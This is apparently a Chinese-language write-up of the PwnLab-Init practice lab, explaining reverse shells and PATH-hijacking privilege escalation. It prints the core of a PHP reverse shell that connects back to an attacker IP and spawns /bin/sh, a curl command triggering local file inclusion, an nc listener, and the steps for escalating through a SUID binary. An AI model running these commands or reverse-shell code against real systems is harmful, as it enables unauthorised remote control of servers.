### 1. Reverse Shell (反弹Shell)
---
Kali Linux中，有一个常用的`/usr/share/webshells/php/php-reverse-shell.php`
核心代码如下：
```php
set_time_limit(0);
$VERSION = "1.0";
$ip = '192.168.1.3';  // CHANGE THIS TO YOUR OWN IP
$port = 7777;       // CHANGE THIS
$shell = 'uname -a; w; id; /bin/sh -i';
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
$process = proc_open($shell, $descriptorspec, $pipes);
```
那 Reverse Shell 究竟是什么？
#### 正向连接 vs 反向连接
- **正向连接 (Bind Shell)**：你去连接服务器。比如 SSH，你输入`ssh root@192.168.1.193`。这要求服务器必须**开着大门（端口）**，而且**防火墙允许**你进去。
- **反向连接 (Reverse Shell)**：服务器来连接你。因为大多数防火墙策略是“严进宽出”（禁止外部主动连入，但允许内部主动连出）。
#### 工作原理
在 PwnLab-Init 中，利用
```bash
curl -v --cookie "lang=../upload/7b2b8553fec172b77b3c3bf2fd832f15.gif" http://192.168.1.193:80
```
触发 LFI 后，会发生以下反应：
1. **触发执行**：Web 服务器（Apache）以`www-data`用户的身份执行了上传的 PHP 代码。
2. **发起呼叫**：PHP 代码中的 `fsockopen($ip, $port)` 要求靶机服务器向主机IP的 7777 端口发起一个 TCP 连接。
3. **建立管道**：连接一旦建立，PHP 代码中的 `proc_open('/bin/sh')` 会启动 Shell。
4. **IO 重定向 (关键点)**：PHP 代码把 Shell 的输入（stdin）和输出（stdout）全部定向为刚才建立的 TCP 连接上。
再通过让主机监听 7777 端口，允许 TCP 外部连接
```bash
nc -lvnp 7777
```
这样，Reverse Shell 就成功让攻击者控制了服务器内部。

### 2. 环境变量劫持 (PATH Hijacking)
---
**这是从普通用户提权到中间用户的关键。**
#### Linux 怎么找命令？
当你在终端输入`cat /etc/passwd`时，系统怎么知道`cat`这个程序在哪里？  
它会去查一个叫 **$PATH** 的环境变量。
- 默认的 `$PATH` 长这样：`/usr/bin:/bin:/usr/local/bin`
- 系统逻辑：先去`/usr/bin`找有没有`cat`？没有。再去`/bin`找？找到了！执行它。
#### 漏洞原理
靶机中，有漏洞的 SUID 程序（`msgmike`）在代码里是这样写的（伪代码）：
```c
system("cat message.txt");    // 错误写法：使用了相对路径
```
它**没有**写死绝对路径`/bin/cat`，而是只写了`cat`。这就允许以下事情发生：
1. **造假**：伪造叫`cat`的脚本（里面其实是 `/bin/bash`），放在当前目录`./`下。
2. **插队**：修改了`$PATH`变量：`export PATH=.`。现在`./`排在了第一位。
3. **触发**：运行`msgmike`程序：系统按照`$PATH`变量，找到并执行了`cat`伪造脚本。
又因为`msgmike`是 **SUID** 程序（属主是高权限用户），所以它调用的伪造脚本也以**高权限**运行。